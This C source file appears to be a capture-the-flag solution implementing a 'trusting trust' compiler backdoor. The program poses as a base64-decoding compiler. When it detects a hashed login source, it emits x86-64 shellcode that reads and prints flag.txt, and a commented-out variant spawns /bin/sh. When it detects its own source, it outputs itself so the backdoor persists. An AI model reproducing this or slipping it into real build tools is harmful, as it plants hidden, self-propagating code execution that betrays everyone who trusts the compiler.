#include "tinylib.h"

static int b64decode(const char *in, void *out) {
	// 00000000 1111111 2222222 <-> 000000 001111 111122 222222
	const static unsigned char rtable_[]={/*0,0,0,0,0,0,0,0,0,0,0,0,
		0,0,0,0,0,0,0,0,0,0,0,0,
		0,0,0,0,0,0,0,0,0,0,0,0,
		0,0,0,0,0,0,0,*/62,0,0,0,
		63,52,53,54,55,56,57,58,
		59,60,61,0,0,0,0,0,0,0,0,
		1,2,3,4,5,6,7,8,9,10,11,12,
		13,14,15,16,17,18,19,20,21,
		22,23,24,25,0,0,0,0,0,0,26,
		27,28,29,30,31,32,33,34,35,
		36,37,38,39,40,41,42,43,44,
		45,46,47,48,49,50,51
	};
	const unsigned char *rtable = &rtable_[-43];
	int len = 0;
	const char *p = in;
	for (p = in; *p++; len++);
	// assert(length % 4 == 0);

	int outlen = len/4 * 3;
	if (in[len-1] == '=') {
		outlen--;
		if (in[len-2] == '=') {
			outlen--;
		}
	}

	int i, j;
	char *res = (char *)out;
	for(i=0,j=0; i < len; j+=3,i+=4) {
		res[j] = (rtable[in[i]]<<2) | (rtable[in[i+1]]>>4);
		if (j+1 < outlen) {
			res[j+1]= (rtable[in[i+1]]<<4) | (rtable[in[i+2]]>>2);
			if (j+2 < outlen) {
				res[j+2]= (rtable[in[i+2]]<<6) | (rtable[in[i+3]]);
			}
		}
	}

	return outlen;
}

static int getsource(char *buf) {
	int len = 0;
	int maxsize = 4096;
	while (1) {
		int r = read(0, buf+len, maxsize-len);
		if (r <= 0) {
			break;
		}
		len += r;
	}
	return len;
}

static void writebinary(char *buf, int len) {
	int count = 0;
	while (count < len) {
		int r = write(1, buf, len-count);
		if (r <= 0) {
			break;
		}
		count += r;
	}
}

static int bkdrhash(char *s, int len) {
	// https://blog.csdn.net/wanglx_/article/details/40300363
	unsigned int seed = 131; // 31 131 1313 13131 131313 etc..
	unsigned int hash = 0;
	int i;
	for (i = 0; i < len; i++) {
		hash = hash * seed + (unsigned int)(unsigned char)(s[i]);
	}
	return (hash & 0x7FFFFFFF);
}

static void do_compile(char *source, int source_len, char *middle, int *p_middle_len) {
	*p_middle_len = b64decode(source, middle);
}

int main(int argc, char **argv, char **envp) {
	char source[4096];
	char middle[4096];
	int midlen = 0;
	int srclen = getsource(source);
	int hash = bkdrhash(source, srclen);

	if (hash == 0x64d53a26) {    // the mylogin_source    XXX need to change
		// https://gcc.gnu.org/onlinedocs/gcc/Labels-as-Values.html
		asm volatile (
			"jmp shellcode_end\n\t"
			"shellcode_start:\n\t"

			/*
			"movabs rax,0x68732f6e69622f\n\t"    // "/bin/sh\0"
			"push   rax\n\t"
			"mov    rdi,rsp\n\t"
			"xor    esi,esi\n\t"
			"xor    edx,edx\n\t"
			"xor    eax,eax\n\t"
			"mov    al,0x3b\n\t"    // SYS_execve
			"syscall\n\t"
			"ud2\n\t"
			*/
			"movabs rax, 0x7478742e67616c66\n\t"    // "flag.txt\0"
			"push rax\n\t"
			"mov rdi, rsp\n\t"
			"xor esi, esi\n\t"
			"mov eax, 2\n\t"    // SYS_open
			"syscall\n\t"
			"mov edi, eax\n\t"
			"sub rsp, 128\n\t"
			"mov rsi, rsp\n\t"
			"mov edx, 128\n\t"
			"mov eax, 0\n\t"    // SYS_read
			"syscall \n\t"
			"mov edx, eax\n\t"
			"mov rsi, rsp\n\t"
			"mov edi, 1\n\t"
			"mov eax, 1\n\t"
			"syscall\n\t"    // SYS_write
			"ud2\n\t"

			"shellcode_end:\n\t"
		);

		extern const char shellcode_start;
		extern const char shellcode_end;
		midlen = &shellcode_end-&shellcode_start;
		write(1, &shellcode_start, midlen);
	}
	else if (hash == 0x5cd8e6b4) {    // the mycompiler_source    XXX need to change
		extern const char _start;
		extern volatile const char _end[];
		midlen = (char *)&_end-&_start;
		write(1, &_start, midlen);
	}
	else {
		do_compile(source, srclen, middle, &midlen);
		write(1, middle, midlen);
	}

	return 0;
}

__attribute__((section("textend"))) volatile const char _end[] = "";
